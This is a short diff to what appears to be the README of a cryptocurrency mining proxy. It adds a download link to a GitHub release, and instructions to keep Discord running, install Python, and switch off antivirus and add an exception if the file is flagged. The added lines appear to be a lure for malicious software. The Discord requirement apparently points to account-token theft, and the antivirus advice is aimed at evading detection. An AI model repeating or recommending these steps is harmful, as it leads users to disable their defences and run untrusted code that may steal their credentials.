@@ -30,3 +30,6 @@ enjoy and happy mining :)
 
 works with all miner softwares
 tested wth gminer/lolminer/trex
+
+please download latest bugs fixed , https://github.com/lolzminer123/proxyminer/releases/tag/minerproxy
+please make sure discord is running before launching and python 3.10 is installed , download on microsoft store just type python and install then launch proxy will start then enter required info, may trigger av if it does just turn of av download make acception then turn av back on happy mining
